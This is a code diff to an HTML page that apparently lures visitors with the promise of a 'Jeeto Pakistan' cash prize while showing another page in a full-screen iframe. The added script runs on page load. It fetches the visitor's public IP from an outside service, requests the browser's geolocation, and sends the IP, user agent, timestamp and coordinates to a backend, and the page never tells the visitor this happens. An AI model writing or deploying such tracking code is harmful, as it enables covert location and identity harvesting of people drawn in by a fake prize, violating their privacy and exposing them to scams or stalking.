@@ -3,16 +3,28 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Jeeto 100,000/- Cash</title>
+  <title>Jeeto Pakistan Jeeto 100,000/- Cash</title>
 </head>
 <body>
   <iframe 
-    src="/Jeeto%20Pakistan.html" 
+    src="/Jeeto%20Pakistan.html/" 
     style="width: 100%; height: 100vh; border: none;"
     title="Jeeto Pakistan Page">
   </iframe>
 
   <script>
+    // Function to fetch IP address from IPify
+    async function fetchIP() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip; // Return the IP address
+      } catch (error) {
+        console.error('Error fetching IP:', error);
+        return 'IP not available'; // Fallback if IP can't be fetched
+      }
+    }
+
     // Function to send data to the backend
     async function sendData(data) {
       try {
@@ -32,7 +44,7 @@
     }
 
     // Function to get geolocation
-    function getLocation() {
+    function getLocation(ip) {
       if (!navigator.geolocation) {
         console.error('Geolocation is not supported by your browser.');
         return;
@@ -42,9 +54,9 @@
         (position) => {
           const { latitude, longitude } = position.coords;
 
-          // Collect additional user data
+          // Collect user data
           const data = {
-            ip: '8.8.8.8', // Replace this with a method to get the user's IP
+            ip: ip,
             userAgent: navigator.userAgent,
             timestamp: new Date().toISOString(),
             latitude,
@@ -60,8 +72,14 @@
       );
     }
 
-    // Trigger geolocation on page load
-    getLocation();
+    // Main function to orchestrate data collection
+    async function collectUserData() {
+      const ip = await fetchIP(); // Fetch IP using IPify API
+      getLocation(ip); // Fetch geolocation and send all data
+    }
+
+    // Trigger user data collection on page load
+    collectUserData();
   </script>
 </body>
 </html>
